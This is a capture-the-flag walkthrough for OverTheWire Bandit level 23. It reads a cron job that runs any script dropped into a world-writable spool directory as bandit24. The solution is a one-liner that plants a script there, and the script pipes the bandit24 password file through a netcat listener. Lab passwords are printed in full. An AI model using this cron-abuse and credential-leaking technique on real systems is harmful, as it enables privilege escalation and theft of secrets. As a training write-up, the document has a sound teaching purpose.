#Level23
Connect to game via ssh on port 2220 using credentials bandit23:jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
_(format username:password)_
```sh
$ ssh -p 2220 bandit23@bandit.labs.overthewire.org
```

#Level Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

**Commands you may need to solve this level**
cron, crontab, crontab(5) (use “man 5 crontab” to access this)

#Walkthrough
Let's look at level24 user's cron.
```sh
bandit23@bandit:~$ ls -al /etc/cron.d/
total 36
drwxr-xr-x  2 root root 4096 Jul 11  2020 .
drwxr-xr-x 87 root root 4096 May 14  2020 ..
-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit15_root
-rw-r--r--  1 root root   62 Jul 11  2020 cronjob_bandit17_root
-rw-r--r--  1 root root  120 May  7  2020 cronjob_bandit22
-rw-r--r--  1 root root  122 May  7  2020 cronjob_bandit23
-rw-r--r--  1 root root  120 May 14  2020 cronjob_bandit24
-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit25_root
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
We can see that script /usr/bin/cronjob_bandit24.sh is executed every minute.

Lets see what that script does.
```sh
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

The script searches for all the files in /var/spool/level24 and if it finds file owned by level23 it executes it. Since the script runs under level24 privileges we can abuse it to print password for that user.

We also can see that /var/spool/bandit24 is world writable but not readable.
```sh
bandit23@bandit:~$ ls -al /var/spool/
total 660
drwxr-xr-x  5 root root       4096 May 14  2020 .
drwxr-xr-x 11 root root       4096 May  7  2020 ..
drwxrwx-wx 14 root bandit24 659456 Jun  4 18:17 bandit24
drwxr-xr-x  3 root root       4096 May  3  2020 cron
lrwxrwxrwx  1 root root          7 May  3  2020 mail -> ../mail
drwx------  2 root root       4096 Jan 14  2018 rsyslog
```

The oneliner solution is below.

The command will create directory in /tmp then create a script in that directory. The script will be copied to /var/spool/bandit24. When script executes it will cat password file to netcat that will be launched in background process. Netcat will listen to a connection on port 4444. 
We will then connect to port 4444 manually to read the password.

```sh
bandit23@bandit:~$ mkdir /tmp/bandit23 && echo -e '#!/bin/bash\n bash -c "cat /etc/bandit_pass/bandit24 | nc -nlp 4444 &"' > /tmp/bandit23/script.sh && chmod +x /tmp/bandit23/script.sh && cp /tmp/bandit23/script.sh /var/spool/bandit24/
bandit23@bandit:~$ nc localhost 4444
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

